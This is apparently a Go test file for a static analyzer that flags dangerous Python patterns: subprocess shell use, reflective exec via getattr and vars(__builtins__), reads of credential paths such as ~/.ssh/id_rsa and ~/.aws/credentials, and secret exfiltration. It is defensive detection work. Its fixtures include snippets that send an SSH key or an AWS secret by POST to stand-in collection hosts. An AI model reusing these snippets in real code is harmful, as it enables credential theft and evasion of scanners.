package analyzer

import (
	"context"
	"testing"

	"github.com/domehahn/skil/pkg/skil"
)

func TestPythonASTResolvesAliasesAndIgnoresStrings(t *testing.T) {
	source := `import subprocess as sp
from os import system as run
import pickle, requests as http

text = "exec(payload) and subprocess.run(command)"
# eval(payload)
sp.run(["id"])
run("id")
pickle.loads(payload)
http.post(url, data=payload)
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	counts := map[string]int{}
	for _, finding := range findings {
		counts[finding.RuleID]++
	}
	if counts["SKIL-PY-001"] != 0 || counts["SKIL-PY-002"] != 1 || counts["SKIL-PY-003"] != 1 || counts["SKIL-NET-001"] != 1 {
		t.Fatalf("%#v", findings)
	}
}

func TestPythonASTSafeSubprocessCallIsObservedWithoutFinding(t *testing.T) {
	// A static, argv-only subprocess call with no shell=True is legitimate
	// declared-capability usage and must not itself produce a Finding, but
	// verification cannot tell "safely used the capability" apart from
	// "never used it" unless the usage is still recorded as an observation.
	source := "import subprocess\nsubprocess.Popen([\"git\", \"status\", \"--short\"]).wait()\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			t.Fatalf("safe argv-only subprocess call must not produce a finding: %#v", findings)
		}
	}
	found := false
	for _, obs := range observations {
		if obs.Capability == "commands.execute" && obs.Value == "git" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected a commands.execute observation for the safe subprocess call: %#v", observations)
	}
}

func TestPythonASTCallableAliasResolvesToUnderlyingIdentity(t *testing.T) {
	// The mega-prompt's own primary example: a variable alias to a tracked
	// call's attribute (not just the narrower exec-family reflective
	// sinks) must be treated exactly like a direct call to that target.
	source := "import os as system_api\nexecute = system_api.system\nexecute(command)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID != "SKIL-PY-002" {
			continue
		}
		identity, ok := finding.Evidence["callable_identity"].(skil.CallableIdentity)
		if !ok || identity.Module != "os" || identity.Symbol != "system" || identity.Canonical != "python://stdlib/os/system" {
			t.Fatalf("expected the alias to resolve to os.system's canonical identity: %#v", finding.Evidence)
		}
		if len(identity.Provenance) == 0 {
			t.Fatalf("expected the alias assignment to be recorded as provenance: %#v", identity)
		}
		return
	}
	t.Fatalf("expected the aliased call to be resolved and flagged: %#v", findings)
}

func TestPythonASTCallableAliasChainResolves(t *testing.T) {
	source := "import subprocess\nrunner = subprocess.run\nrunner2 = runner\nrunner2(cmd)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-PY-002") {
		t.Fatalf("expected a chained alias (runner2 = runner) to resolve: %#v", findings)
	}
}

func TestPythonASTCallableAliasReassignmentDoesNotInheritStaleIdentity(t *testing.T) {
	// Runtime-order-aware resolution: reassigning the alias to something
	// this pass doesn't track must invalidate the prior binding -- the
	// second call must not automatically inherit the first identity.
	source := "import subprocess\nrunner = subprocess.run\nrunner = safe_wrapper\nrunner(cmd)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(findings, "SKIL-PY-002") {
		t.Fatalf("a reassigned-away alias must not resolve to the prior binding: %#v", findings)
	}
}

func TestPythonASTCallableAliasReassignmentToTrackedTargetResolves(t *testing.T) {
	source := "import subprocess\nrunner = safe_wrapper\nrunner = subprocess.run\nrunner(cmd)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID != "SKIL-PY-002" {
			continue
		}
		identity, ok := finding.Evidence["callable_identity"].(skil.CallableIdentity)
		if !ok || identity.Canonical != "python://stdlib/subprocess/run" {
			t.Fatalf("expected the later assignment to win: %#v", finding.Evidence)
		}
		return
	}
	t.Fatalf("expected the reassigned-to-a-tracked-target alias to resolve: %#v", findings)
}

func TestPythonASTThirdPartyModuleIsNeverAssumedStdlib(t *testing.T) {
	source := "import requests\nrequests.get(url)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID != "SKIL-NET-001" {
			continue
		}
		identity, ok := finding.Evidence["callable_identity"].(skil.CallableIdentity)
		if !ok || identity.Canonical != "python://external/requests/get" {
			t.Fatalf("a module absent from the curated stdlib allowlist must never be assumed stdlib: %#v", finding.Evidence)
		}
		return
	}
	t.Fatalf("expected a callable identity on the requests.get finding: %#v", findings)
}

func TestPythonASTBooleanConstantPropagatesToShellTrue(t *testing.T) {
	// The exact case Cisco 2.1.0 handles and skil's own prior textual
	// "shell=true" substring check missed entirely: a boolean assigned to a
	// named variable, then passed as shell=<var>.
	source := "import subprocess\ndangerous = True\nsubprocess.run([\"id\"], shell=dangerous)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			if finding.Evidence["shell_flag_resolution"] != nil {
				t.Fatalf("a confirmed shell=True must not be marked unresolved: %#v", finding.Evidence)
			}
			return
		}
	}
	t.Fatalf("expected SKIL-PY-002 once shell=True is resolved through the constant: %#v", findings)
}

func TestPythonASTBooleanConstantPropagatesToShellFalseStaysSafe(t *testing.T) {
	source := "import subprocess\nsafe = False\nsubprocess.run([\"id\"], shell=safe)\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			t.Fatalf("shell=False resolved through a constant must not produce a finding: %#v", findings)
		}
	}
	found := false
	for _, obs := range observations {
		if obs.Capability == "commands.execute" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected the safe call to still be observed: %#v", observations)
	}
}

func TestPythonASTLastAssignmentWinsForShellConstant(t *testing.T) {
	// Matches Python's own runtime semantics: the last assignment before use
	// is the value that actually applies.
	source := "import subprocess\nflag = True\nflag = False\nsubprocess.run([\"id\"], shell=flag)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			t.Fatalf("last-assignment-wins must resolve to the final False: %#v", findings)
		}
	}
}

func TestPythonASTUnresolvedShellIdentifierIsReportedAsUnresolvedNotSafe(t *testing.T) {
	// An identifier this bounded pass never tracked (a function parameter,
	// a value returned from a call, ...) must not be silently treated as
	// safe: ambiguous is reported, distinctly labeled, never SAFE.
	source := "import subprocess\ndef run(flag):\n    subprocess.run([\"id\"], shell=flag)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			if finding.Evidence["shell_flag_resolution"] != "unresolved" {
				t.Fatalf("expected the ambiguous shell flag to be explicitly marked unresolved: %#v", finding.Evidence)
			}
			return
		}
	}
	t.Fatalf("expected an unresolved-shell-flag finding rather than silent safety: %#v", findings)
}

func TestPythonASTKwargsDictShellTrueIsDetected(t *testing.T) {
	source := `import subprocess
opts = {"shell": True}
subprocess.run(["id"], **opts)
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			return
		}
	}
	t.Fatalf("expected shell=True unpacked from a **kwargs dict literal to be detected: %#v", findings)
}

func TestPythonASTKwargsDictShellFalseStaysSafe(t *testing.T) {
	source := `import subprocess
opts = {"shell": False, "timeout": 5}
subprocess.run(["id"], **opts)
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			t.Fatalf("**kwargs shell=False must not produce a finding: %#v", findings)
		}
	}
}

func TestPythonASTUnresolvedKwargsSplatIsReportedAsUnresolved(t *testing.T) {
	source := "import subprocess\ndef run(opts):\n    subprocess.run([\"id\"], **opts)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			if finding.Evidence["shell_flag_resolution"] != "unresolved" {
				t.Fatalf("an unresolvable **kwargs unpack must be marked unresolved, not silently safe: %#v", finding.Evidence)
			}
			return
		}
	}
	t.Fatalf("expected an unresolved-shell-flag finding for an untracked **kwargs unpack: %#v", findings)
}

func TestPythonASTBareIdentifierExecAliasIsReflective(t *testing.T) {
	source := "fn = exec\nfn(payload)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-PY-REFLECT-EXEC") || !hasRule(findings, "SKIL-PY-001") {
		t.Fatalf("expected a bare `fn = exec` alias to be caught as reflective execution: %#v", findings)
	}
}

func TestPythonASTVarsSubscriptReflectiveBuiltinsDunderIsDetected(t *testing.T) {
	source := `vars(__builtins__)["exec"](payload)
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-PY-REFLECT-EXEC") || !hasRule(findings, "SKIL-PY-001") {
		t.Fatalf("expected vars(__builtins__)[\"exec\"](...) to be recognized: %#v", findings)
	}
}

func TestPythonASTVarsSubscriptReflectiveBuiltinsModuleIsDetected(t *testing.T) {
	source := "import builtins\nvars(builtins)[\"exec\"](payload)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-PY-REFLECT-EXEC") || !hasRule(findings, "SKIL-PY-001") {
		t.Fatalf("expected vars(builtins)[\"exec\"](...) to be recognized, including the underlying direct-sink rule: %#v", findings)
	}
}

func TestPythonASTVarsSubscriptAliasedThenCalledIsReflective(t *testing.T) {
	// The `name = getattr(module, "attr")` alias case already caught
	// (fn = getattr(...); fn(...)) must also work for the vars(...)[...]
	// indirection: fn = vars(__builtins__)["exec"]; fn(...).
	source := `fn = vars(__builtins__)["exec"]
fn(payload)
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-PY-REFLECT-EXEC") || !hasRule(findings, "SKIL-PY-001") {
		t.Fatalf("expected the aliased vars(...)[...] indirection to be recognized, including the underlying direct-sink rule: %#v", findings)
	}
}

func TestPythonASTVarsSubscriptOfOrdinaryModuleIsNotReflective(t *testing.T) {
	// vars(some_module)["some_name"] where the target isn't a known
	// dynamic-execution sink must not be flagged -- only the curated
	// dangerous (module, name) pairs matter, matching getattr's own
	// narrowness.
	source := `vars(config)["timeout"]()
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(findings, "SKIL-PY-REFLECT-EXEC") {
		t.Fatalf("an unrelated vars(...)[...] indirection must not be flagged: %#v", findings)
	}
}

func TestPythonASTBuiltinsDunderReflectiveGetattrIsDetected(t *testing.T) {
	source := `getattr(__builtins__, "exec")(payload)
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-PY-REFLECT-EXEC") {
		t.Fatalf("expected getattr(__builtins__, \"exec\") to be recognized (not just the 'builtins' module alias): %#v", findings)
	}
}

func TestPythonASTAliasingAnOrdinaryCallIsNotReflective(t *testing.T) {
	// Aliasing a non-dangerous tracked call (requests.get) must not be
	// mistaken for reflective execution -- isDirectDangerousSink is
	// narrower than "any name in pythonCalls".
	source := "import requests\nfetch = requests.get\nfetch(url)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(findings, "SKIL-PY-REFLECT-EXEC") {
		t.Fatalf("aliasing an ordinary tracked call must not fire SKIL-PY-REFLECT-EXEC: %#v", findings)
	}
}

func TestPythonASTConstructedSSHKeyPathViaChainedPathlibJoins(t *testing.T) {
	source := "from pathlib import Path\nhome = Path.home()\nssh = home / \".ssh\"\nkey = ssh / \"id_rsa\"\nopen(key)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-SEC-001" && finding.Evidence["constructed_path"] == "~/.ssh/id_rsa" {
			return
		}
	}
	t.Fatalf("expected a constructed-path finding for chained Path.home()/\".ssh\"/\"id_rsa\": %#v", findings)
}

func TestPythonASTConstructedAWSCredentialsPathViaOsPathJoin(t *testing.T) {
	source := "import os\npath = os.path.join(os.path.expanduser(\"~\"), \".aws\", \"credentials\")\nopen(path)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-SEC-001" && finding.Evidence["constructed_path"] == "~/.aws/credentials" {
			return
		}
	}
	t.Fatalf("expected a constructed-path finding for os.path.join(expanduser, \".aws\", \"credentials\"): %#v", findings)
}

func TestPythonASTConstructedSensitivePathDirectChain(t *testing.T) {
	source := "from pathlib import Path\ndirect = Path.home() / \".ssh\" / \"id_rsa\"\nopen(direct)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("expected a constructed-path finding: %#v", findings)
	}
}

func TestPythonASTConstructedGcloudPath(t *testing.T) {
	source := "from pathlib import Path\nconfig = Path.home() / \".config\" / \"gcloud\" / \"credentials.db\"\nopen(config)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-SEC-001" && finding.Evidence["matched_sensitive_root"] == "~/.config/gcloud" {
			return
		}
	}
	t.Fatalf("expected a constructed-path finding matching ~/.config/gcloud: %#v", findings)
}

func TestPythonASTConstructedBenignPathIsNotFlagged(t *testing.T) {
	// A non-sensitive constructed path (joining the home directory with an
	// ordinary document path) must not be flagged merely because path
	// construction was resolved at all -- only the curated sensitive roots
	// matter, never "any constructed path".
	source := "import os\npath = os.path.join(os.path.expanduser(\"~\"), \"Documents\", \"notes.txt\")\nopen(path)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("a benign constructed path must not be flagged: %#v", findings)
	}
}

func TestPythonASTUnresolvableConstructedPathIsDeclinedNotGuessed(t *testing.T) {
	// os.path.join with a non-literal, unresolvable argument must not be
	// guessed at -- declined entirely, matching the same "ambiguous is
	// never silently resolved" invariant as the shell-flag propagation.
	source := "import os\ndef load(name):\n    path = os.path.join(os.path.expanduser(\"~\"), name)\n    open(path)\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("an unresolvable path segment must not produce a constructed-path finding: %#v", findings)
	}
}

func TestPythonASTConstructedPathFeedsEvidenceGraphExfiltrationCorrelation(t *testing.T) {
	// The constructed-path finding reuses the existing SKIL-SEC-001 rule ID,
	// so it must automatically participate in evidencegraph.go's existing
	// credential-read + network-operation INFERRED correlation without any
	// separate wiring.
	source := "from pathlib import Path\nimport requests\n\nkey_path = Path.home() / \".ssh\" / \"id_rsa\"\nwith open(key_path) as f:\n    key = f.read()\nrequests.post(\"https://example.com/collect\", data=key)\n"
	registry := DefaultRegistry(nil)
	result, err := registry.Scan(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if result.EvidenceGraph == nil {
		t.Fatal("expected a populated evidence graph")
	}
	found := false
	for _, edge := range result.EvidenceGraph.Edges {
		if edge.Relation == "potential-exfiltration" && edge.State == skil.EvidenceInferred {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected the constructed-path SKIL-SEC-001 finding to correlate with the network op as INFERRED exfiltration: %#v", result.EvidenceGraph.Edges)
	}
}

func TestPythonASTReadOnlyFileOpenIsObservedWithoutFinding(t *testing.T) {
	// Reading a file in the default (read) mode is not itself dangerous and
	// must not produce a Finding, but it is legitimate declared
	// filesystem.read capability usage and must be observable so a
	// contract that declares filesystem.read is not reported overdeclared.
	source := "data = open(\"docs/readme.txt\").read()\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("read-only open() must not produce a finding: %#v", findings)
	}
	found := false
	for _, obs := range observations {
		if obs.Capability == "filesystem.read" && obs.Value == "docs/readme.txt" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected a filesystem.read observation for the read-only open() call: %#v", observations)
	}
}

func TestPythonASTEnvironmentVariableReadIsObservedForBothCapabilities(t *testing.T) {
	// os.getenv reading a named variable is simultaneously secrets.read
	// evidence (the SKIL-SEC-001 finding) and environment.read capability
	// usage, both of which must be independently observable.
	source := "import os\ntoken = os.getenv(\"API_TOKEN\")\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("expected the existing SKIL-SEC-001 finding to still fire: %#v", findings)
	}
	var sawSecrets, sawEnvironment bool
	for _, obs := range observations {
		if obs.Capability == "secrets.read" && obs.Value == "API_TOKEN" {
			sawSecrets = true
		}
		if obs.Capability == "environment.read" && obs.Value == "API_TOKEN" {
			sawEnvironment = true
		}
	}
	if !sawSecrets || !sawEnvironment {
		t.Fatalf("expected both secrets.read and environment.read observations: %#v", observations)
	}
}

// TestPythonASTSecretUsedOnlyForAuthenticationIsSafe is a regression test
// for issue #34 (benchmark/corpus/development/bench-010): a token read from
// the environment and used only as the Authorization header of a single,
// fixed-destination GET call — the shape every legitimate authenticated API
// client has — must not fire SKIL-SEC-001. The capability must still be
// observable (see the CapabilityObservation loop below), only the Finding
// is suppressed.
func TestPythonASTSecretUsedOnlyForAuthenticationIsSafe(t *testing.T) {
	source := "import os\nimport requests\n\n" +
		"token = os.environ[\"GITHUB_TOKEN\"]\n" +
		"response = requests.get(\n" +
		"    \"https://api.github.com/repos/example-org/example-repo/pulls\",\n" +
		"    headers={\"Authorization\": f\"Bearer {token}\"},\n" +
		")\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("a credential used only as an Authorization header on a fixed-destination GET must not fire SKIL-SEC-001: %#v", findings)
	}
	found := false
	for _, obs := range observations {
		if obs.Capability == "secrets.read" {
			found = true
		}
	}
	if !found {
		t.Fatalf("authentication-only credential usage must still be observed as secrets.read: %#v", observations)
	}
}

// TestPythonASTCredentialExfiltrationStillDetected guards the other side of
// the same fix: a credential that reaches a second, unrelated sink (here,
// a POST with the secret in the body to a different destination) must
// still fire SKIL-SEC-001 — the authentication-only guard must not become
// a general bypass for real exfiltration.
func TestPythonASTCredentialExfiltrationStillDetected(t *testing.T) {
	source := "import os\nimport requests\n\n" +
		"secret = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n" +
		"requests.post(\"https://evil.invalid/collect\", data={\"secret\": secret})\n"
	findings, _, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("expected credential exfiltration to still fire SKIL-SEC-001: %#v", findings)
	}
}

func TestPythonASTDynamicGetattrAndWriteMode(t *testing.T) {
	source := "name = input()\ngetattr(target, name)()\nopen('safe.txt', 'r')\nopen('out.txt', mode='w')\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 2 {
		t.Fatalf("%#v", findings)
	}
}

func TestPythonASTReflectiveGetattrSink(t *testing.T) {
	source := `import os as operating
import builtins as bi

getattr(operating, "system")("id")
getattr(operating, "execvp")("id", ["id"])
getattr(bi, "exec")(payload)
getattr(os, "path")
getattr(helper, "render")()
getter = getattr(os, "system")
text = "getattr(os, 'system')('id')"
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	var ast9 []skil.Finding
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-REFLECT-EXEC" {
			ast9 = append(ast9, finding)
		}
	}
	if len(ast9) != 3 {
		t.Fatalf("reflective execution findings = %d, want 3: %#v", len(ast9), findings)
	}
	for _, finding := range ast9 {
		if finding.Evidence["capability"] != "commands.execute" {
			t.Fatalf("missing command capability evidence: %#v", finding)
		}
	}
}
